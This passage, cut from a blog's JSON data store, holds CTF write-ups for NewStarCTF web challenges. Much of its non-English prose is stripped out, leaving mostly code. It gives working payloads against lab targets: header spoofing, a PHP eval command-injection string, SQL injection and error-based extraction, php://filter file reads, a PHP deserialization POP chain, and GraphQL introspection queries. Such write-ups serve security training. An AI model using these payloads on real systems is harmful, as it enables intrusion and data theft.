class=\"fas fa-external-link-alt\"></i></a> header </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer=http://www.google.com</span><br></pre></td></tr></table></figure>\n\n<p> Referer  </p>\n</blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/shenqueying/article/details/79426884\" >referer<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p><strong>referer:ctf.com</strong></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png\"\n                        alt=\"-1665405614966\"\n                 ></p>\n<p>localphpX-Forward-For</p>\n<p><a class=\"link\"   href=\"https://www.jianshu.com/p/15f3498a7fad\" >X-Forwarded-For<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p><strong>X-Fordward-For:127.0.0.1</strong></p>\n<p>127.0.0.1</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png\"\n                        alt=\"-1665405624087\"\n                 ></p>\n<p>flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}</p>\n<h1 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png\"\n                        alt=\"-1665405631706\"\n                 ></p>\n<p>flag</p>\n<p></p>\n<p>robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a> index.php~ </p>\n<p>robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png\"\n                        alt=\"-1665405645261\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png\"\n                        alt=\"-1665405650443\"\n                 ><br><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png\"\n                        alt=\"-1665405656120\"\n                 ></p>\n<p>flag</p>\n<p>dirsearchbuu</p>\n<h1 id=\"4-NotPHP\"><a href=\"#4-NotPHP\" class=\"headerlink\" title=\"4.NotPHP\"></a>4.NotPHP</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hack Me&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Number error!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Wrong Key!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Pass it!&quot;</span>);</span><br><span class=\"line\">&#125; Pass it!</span><br></pre></td></tr></table></figure>\n\n<p>php</p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_45290991/article/details/113852174\" >file_get_contents<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/linfangnan/p/13535097.html\" >php<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>data</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?data=data:<span class=\"comment\">//text/plain,Welcome to CTF</span></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>key1key2md5key1key2md5</p>\n<p><a class=\"link\"   href=\"https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7\" >md5<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>key1key2md500&#x3D;&#x3D;&#x3D;0</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1[]=<span class=\"number\">1</span>&amp;key2[]=<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)</span><br></pre></td></tr></table></figure>\n\n<p>is_numeric</p>\n<p>intval() </p>\n<p>numnum&#x3D;2077&#x3D;&#x3D;</p>\n<p>num&#x3D;2077a</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num=<span class=\"number\">2077</span>a</span><br></pre></td></tr></table></figure>\n\n<p>intval(2077a)&#x3D;2077</p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>rce#</p>\n<p></p>\n<p>1.?&gt;</p>\n<p>2.%0a</p>\n<p> %20</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=%<span class=\"number\">0</span>asystem(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=<span class=\"meta\">?&gt;</span><span class=\"meta\">&lt;?</span><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}</p>\n<h1 id=\"5-Word-For-You\"><a href=\"#5-Word-For-You\" class=\"headerlink\" title=\"5.Word-For-You\"></a>5.Word-For-You</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png\"\n                        alt=\"-1665405676352\"\n                 ></p>\n<p>sql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png\"\n                        alt=\"-1665405683499\"\n                 ></p>\n<p>sql</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187\" >sql<i class=\"fas fa-external-link-alt\"></i></a></p>\n<br/>\n\n<br/>\n\n<p></p>\n"},{"title":"NewStarCTF WEEK2 WEB","date":"2022-10-10T15:11:51.000Z","excerpt":"NewStarCTF WEEK2 WEB","_content":"\n\n\n# NewStarCTF WEEK2 WEB\n\n## 1.Word-For-You(2 Gen)\n\n\n\n\n\n\n```sql\n1' or 1=1#\n```\n\n![-1665405773483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png)\n\n\n\n![-1665405782381](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png)\n\n~wfy\n\n\n\n```sql\nXPATH syntax error: '~wfy_admin,wfy_comments,wfy_info'    \n```\n\nflagwfy_comments\n\n```sql\n1||updatexml(1,concat(0x7e,(select reverse(group_concat(text)) from wfy_comments)),1)#\n```\n\n```sql\nXPATH syntax error: '~}sr0rre_emos_ek2m_t4uJ{galf,'    //flag\n```\n\n\n\n## 2.IncludeOne\n\n\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);//\necho \"Hint: \".mt_rand().\"<br>\";//1219893521\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){//md5\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) &&//base preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n       //NewStarfile\n        //flag in `flag.php`\n        include($_GET['file']);//\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n```\n\nhttps://www.openwall.com/php_mt_seed/\n\n\n\n\n\n```php\n<?php  \nmt_srand(12345);    \necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\n?>    \n162946439\n\n247161732\n\n1463094264\n\n1878061366\n\n394962642\n```\n\n12345\n\n![-1665405798622](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png)\n\n1145146\n\n1202031004\n\npost\n\nbaserot13\n\n```php\n?file=php://filter/read=string.rot13/resource=flag.php\n```\n\nNewStar\n\n```php\n?file=php://filter/NewStar/read=string.rot13/resource=flag.php\n```\n\n```\nsynt{p1786p1p-rqr8-4524-n796-r3s84050oo92}\n```\n\nrot13\n\n```\nflag{c1786c1c-ede8-4524-a796-e3f84050bb92}\n```\n\n## 3.UnserializeOne\n\n\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    protected $func;\n\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    private $obj;\n    private $var;\n\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n\n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n\nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}\n\n```\n\n\n\n```php\n echo file_get_contents('/flag');\n```\n\n- [x] __construct()\n- __destruct()\n- __call()\n- __callStatic()\n- __get()\n- __set()\n- __isset()isset()empty()\n- __unset()unset()\n- __sleep()serialize()\n- __wakeup()unserialize()\n- __toString()\n- __invoke()\n- __set_state()var_export()\n- __clone()\n- __autoload()\n- __debugInfo()\n\npop**__destruct**Sec**__invoke**\n\n```php\npublic function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n```\n\nnameecho**__tostring**\n\nStartnameSec\n\n```php\npublic function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n```\n\ncheck**__call**\n\nSecobjEasy\n\n```php\npublic function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n```\n\nEasyclaeeee**__clone**\n\n```php\npublic function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n```\n\neeeecm'd**__isset**\n\neeeeobjStart\n\n```php\npublic function __isset($var)\n    {\n        ($this->func)();\n    }\n```\n\n **($this->func)();****__invoke**\n\nStartfuncSec\n\n```php\npublic function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n```\n\n**pop**\n\n```php\n<?php\n//error_reporting(0);\n//highlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    public $func;\n    public function __construct(){\n        $this->func=new Sec();\n        $this->name=new Sec();\n    }\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    public $obj;\n    public $var;\n    public function __construct(){\n        $this->obj=new Easy();\n\n    }\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n    \n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n$c=new eeee();\n$a=new Start();\n$c->obj=$a;\n$b=new Sec();\n$b->var=$c;\n$a->name=$b;\necho serialize($c);\n\n\n```\n\n```php\n?pop=O:4:\"eeee\":1:{s:3:\"obj\";O:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";r:1;}s:4:\"func\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";N;}}}\n```\n\n## 4.ezAPI\n\nwww.zip\n\n```\n<html>\n    <body>\n        <center>\n            <h1>Search Page</h1><br>\n            <hr><br>\n            <form action=\"\" method=\"post\">\n            ID: \n            <input type=\"text\" name=\"id\">\n            <input type=\"submit\" value=\"Search\">\n            </form>\n<?php\nerror_reporting(0);\n$id = $_POST['id'];\nfunction waf($str){\n    if(!is_numeric($str) || preg_replace(\"/[0-9]/\",\"\",$str) !== \"\"){#False,\n        return False;\n    }else{\n        return True;\n    }\n}\n\nfunction send($data)\n{\n    $options = array(\n        'http' => array(\n            'method' => 'POST',\n            'header' => 'Content-type: application/json',\n            'content' => $data,\n            'timeout' => 10 * 60\n        )\n    );\n    $context = stream_context_create($options);\n    $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context);\n    return $result;\n}\n\nif(isset($id)){\n    if(waf($id)){\n        isset($_POST['data']) ? $data=$_POST['data'] : $data='{\"query\":\"query{\\nusers_user_by_pk(id:'.$id.') {\\nname\\n}\\n}\\n\", \"variables\":null}';\n        $res = json_decode(send($data));\n        if($res->data->users_user_by_pk->name !== NULL){\n            echo \"ID: \".$id.\"<br>Name: \".$res->data->users_user_by_pk->name;\n        }else{\n            echo \"<b>Can't found it!</b><br>DEBUG: \";\n            var_dump($res->data);\n        }\n    }else{\n        die(\"<b>Hacker!</b>\");\n    }\n}else{\n    die(\"<b>No Data?</b>\");\n}\n?>\n</center>\n</body>\n</html>\n\n```\n\ngraphQL\n\nhttps://blog.csdn.net/wy_97/article/details/110522150\n\npostdatagraphQLapi\n\n\n\n```\nid=1&data={\"query\":\"query{\\n  __schema {\\n  types {\\n name  \\n }\\n}\\n}\\n\", \"variables\":null}\n```\n\n![-1665405825041](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png)\n\n```\nid=1&data={\"query\":\"query{ffffllllaaagggg_1n_h3r3_flag {flag}}\",\"variables\":null}\n```\n\n```\nflag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}\n```","source":"_posts/NewStarCTF WEEK2 WEB.md","raw":"---\ntitle: NewStarCTF WEEK2 WEB\ndate: 2022-10-10 23:11:51\nexcerpt: NewStarCTF WEEK2 WEB\ncategories: \n---\n\n\n\n# NewStarCTF WEEK2 WEB\n\n## 1.Word-For-You(2 Gen)\n\n\n\n\n\n\n```sql\n1' or 1=1#\n```\n\n![-1665405773483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png)\n\n\n\n![-1665405782381](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png)\n\n~wfy\n\n\n\n```sql\nXPATH syntax error: '~wfy_admin,wfy_comments,wfy_info'    \n```\n\nflagwfy_comments\n\n```sql\n1||updatexml(1,concat(0x7e,(select reverse(group_concat(text)) from wfy_comments)),1)#\n```\n\n```sql\nXPATH syntax error: '~}sr0rre_emos_ek2m_t4uJ{galf,'    //flag\n```\n\n\n\n## 2.IncludeOne\n\n\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);//\necho \"Hint: \".mt_rand().\"<br>\";//1219893521\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){//md5\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) &&//base preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n       //NewStarfile\n        //flag in `flag.php`\n        include($_GET['file']);//\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n```\n\nhttps://www.openwall.com/php_mt_seed/\n\n\n\n\n\n```php\n<?php  \nmt_srand(12345);    \necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\n?>    \n162946439\n\n247161732\n\n1463094264\n\n1878061366\n\n394962642\n```\n\n12345\n\n![-1665405798622](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png)\n\n1145146\n\n1202031004\n\npost\n\nbaserot13\n\n```php\n?file=php://filter/read=string.rot13/resource=flag.php\n```\n\nNewStar\n\n```php\n?file=php://filter/NewStar/read=string.rot13/resource=flag.php\n```\n\n```\nsynt{p1786p1p-rqr8-4524-n796-r3s84050oo92}\n```\n\nrot13\n\n```\nflag{c1786c1c-ede8-4524-a796-e3f84050bb92}\n```\n\n## 3.UnserializeOne\n\n\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    protected $func;\n\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    private $obj;\n    private $var;\n\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n\n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n\nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}\n\n```\n\n\n\n```php\n echo file_get_contents('/flag');\n```\n\n- [x] __construct()\n- __destruct()\n- __call()\n- __callStatic()\n- __get()\n- __set()\n- __isset()isset()empty()\n- __unset()unset()\n- __sleep()serialize()\n- __wakeup()unserialize()\n- __toString()\n- __invoke()\n- __set_state()var_export()\n- __clone()\n- __autoload()\n- __debugInfo()\n\npop**__destruct**Sec**__invoke**\n\n```php\npublic function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n```\n\nnameecho**__tostring**\n\nStartnameSec\n\n```php\npublic function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n```\n\ncheck**__call**\n\nSecobjEasy\n\n```php\npublic function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n```\n\nEasyclaeeee**__clone**\n\n```php\npublic function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n```\n\neeeecm'd**__isset**\n\neeeeobjStart\n\n```php\npublic function __isset($var)\n    {\n        ($this->func)();\n    }\n```\n\n **($this->func)();****__invoke**\n\nStartfuncSec\n\n```php\npublic function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n```\n\n**pop**\n\n```php\n<?php\n//error_reporting(0);\n//highlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    public $func;\n    public function __construct(){\n        $this->func=new Sec();\n        $this->name=new Sec();\n    }\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    public $obj;\n    public $var;\n    public function __construct(){\n        $this->obj=new Easy();\n\n    }\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n    \n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n$c=new eeee();\n$a=new Start();\n$c->obj=$a;\n$b=new Sec();\n$b->var=$c;\n$a->name=$b;\necho serialize($c);\n\n\n```\n\n```php\n?pop=O:4:\"eeee\":1:{s:3:\"obj\";O:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";r:1;}s:4:\"func\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";N;}}}\n```\n\n## 4.ezAPI\n\nwww.zip\n\n```\n<html>\n    <body>\n        <center>\n            <h1>Search Page</h1><br>\n            <hr><br>\n            <form action=\"\" method=\"post\">\n            ID: \n            <input type=\"text\" name=\"id\">\n            <input type=\"submit\" value=\"Search\">\n            </form>\n<?php\nerror_reporting(0);\n$id = $_POST['id'];\nfunction waf($str){\n    if(!is_numeric($str) || preg_replace(\"/[0-9]/\",\"\",$str) !== \"\"){#False,\n        return False;\n    }else{\n        return True;\n    }\n}\n\nfunction send($data)\n{\n    $options = array(\n        'http' => array(\n            'method' => 'POST',\n            'header' => 'Content-type: application/json',\n            'content' => $data,\n            'timeout' => 10 * 60\n        )\n    );\n    $context = stream_context_create($options);\n    $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context);\n    return $result;\n}\n\nif(isset($id)){\n    if(waf($id)){\n        isset($_POST['data']) ? $data=$_POST['data'] : $data='{\"query\":\"query{\\nusers_user_by_pk(id:'.$id.') {\\nname\\n}\\n}\\n\", \"variables\":null}';\n        $res = json_decode(send($data));\n        if($res->data->users_user_by_pk->name !== NULL){\n            echo \"ID: \".$id.\"<br>Name: \".$res->data->users_user_by_pk->name;\n        }else{\n            echo \"<b>Can't found it!</b><br>DEBUG: \";\n            var_dump($res->data);\n        }\n    }else{\n        die(\"<b>Hacker!</b>\");\n    }\n}else{\n    die(\"<b>No Data?</b>\");\n}\n?>\n</center>\n</body>\n</html>\n\n```\n\ngraphQL\n\nhttps://blog.csdn.net/wy_97/article/details/110522150\n\npostdatagraphQLapi\n\n\n\n```\nid=1&data={\"query\":\"query{\\n  __schema {\\n  types {\\n name  \\n }\\n}\\n}\\n\", \"variables\":null}\n```\n\n![-1665405825041](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png)\n\n```\nid=1&data={\"query\":\"query{ffffllllaaagggg_1n_h3r3_flag {flag}}\",\"variables\":null}\n```\n\n```\nflag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}\n```","slug":"NewStarCTF WEEK2 WEB","published":1,"updated":"2024-04-17T08:42:59.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ih0007h7764viadnd7","content":"<h1 id=\"NewStarCTF-WEEK2-WEB\"><a href=\"#NewStarCTF-WEEK2-WEB\" class=\"headerlink\" title=\"NewStarCTF WEEK2 WEB\"></a>NewStarCTF WEEK2 WEB</h1><h2 id=\"1-Word-For-You-2-Gen\"><a href=\"#1-Word-For-You-2-Gen\" class=\"headerlink\" title=\"1.Word-For-You(2 Gen)\"></a>1.Word-For-You(2 Gen)</h2><p></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 